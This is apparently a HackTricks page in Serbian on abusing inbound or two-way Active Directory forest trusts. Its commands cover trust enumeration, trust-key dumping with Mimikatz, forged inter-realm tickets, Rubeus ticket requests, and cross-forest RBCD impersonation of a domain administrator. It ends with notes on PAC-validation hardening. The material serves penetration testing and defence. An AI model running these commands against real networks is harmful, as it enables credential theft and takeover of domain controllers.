# Eksterni Forest domen — Jednosmerno (ulazno) ili dvosmerno

{{#include ../../banners/hacktricks-training.md}}

U ovom scenariju eksterni domen vam veruje (ili postoji obostrano poverenje), pa možete dobiti određeni pristup nad njim.

## Enumeracija

Prvo, treba da **enumerišete** **poverenje**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` omogućavaju vam brzo da proverite da li cross-forest abuse paths (RBCD, SIDHistory) verovatno funkcionišu bez dodatnih preduslova.

U prethodnoj enumeraciji je utvrđeno da se korisnik **`crossuser`** nalazi u grupi **`External Admins`** koja ima **Admin access** unutar **DC eksternog domena**.

## Početni pristup

Ako **niste mogli** da pronađete bilo kakav **poseban** pristup vašeg korisnika u drugom domenu, i dalje možete da se vratite na AD Methodology i pokušate da **privesc from an unprivileged user** (stvari kao kerberoasting, na primer):

Možete koristiti **Powerview functions** da **enumerate** **other domain** koristeći parametar `-Domain`, kao u:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Prijavljivanje

Korišćenjem uobičajene metode sa akreditivima korisnika koji imaju pristup eksternom domenu, trebalo bi da možete pristupiti:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Zloupotreba SID History

Takođe možete zloupotrebiti [**SID History**](sid-history-injection.md) preko trust-a između šuma.

Ako je korisnik migriran **iz jedne šume u drugu** i **SID Filtering nije omogućena**, postaje moguće **dodati SID iz druge šume**, i taj **SID** će biti **dodat** u **token korisnika** prilikom autentifikacije **preko trust-a**.

> [!WARNING]
> Kao podsetnik, možete dobiti ključ za potpisivanje pomoću
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Možete **potpisati pomoću** **trusted** ključa **TGT koji se predstavlja kao** korisnik trenutnog domena.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Potpuno lažno predstavljanje korisnika
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD when you control a machine account in the trusting forest (no SID filtering / selective auth)

Ako vaš foreign principal (FSP) svrsta vas u grupu koja može da piše computer objects u trusting forestu (npr. `Account Operators`, custom provisioning group), možete konfigurisati **Resource-Based Constrained Delegation** na ciljnom hostu te šume i impersonate bilo kog korisnika tamo:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Ovo funkcioniše samo kada je **SelectiveAuthentication is disabled** i **SID filtering** ne uklanja vaš kontrolni SID. To je brz lateralni put koji zaobilazi falsifikovanje **SIDHistory** i često se previdi pri revizijama trustova.

### PAC validation hardening

Ažuriranja validacije PAC potpisa za **CVE-2024-26248**/**CVE-2024-29056** uvode sprovođenje potpisivanja na inter-forest tiketima. U **Compatibility mode**, falsifikovani inter-realm **PAC/SIDHistory/S4U** putevi i dalje mogu raditi na neažuriranim **DCs**. U **Enforcement mode**, nepotpisani ili izmenjeni PAC podaci koji prelaze forest trust se odbacuju osim ako takođe ne posedujete ključ target forest trust-a. Override podešavanja u registru (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) mogu oslabiti ovo dok su dostupna.

## References

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
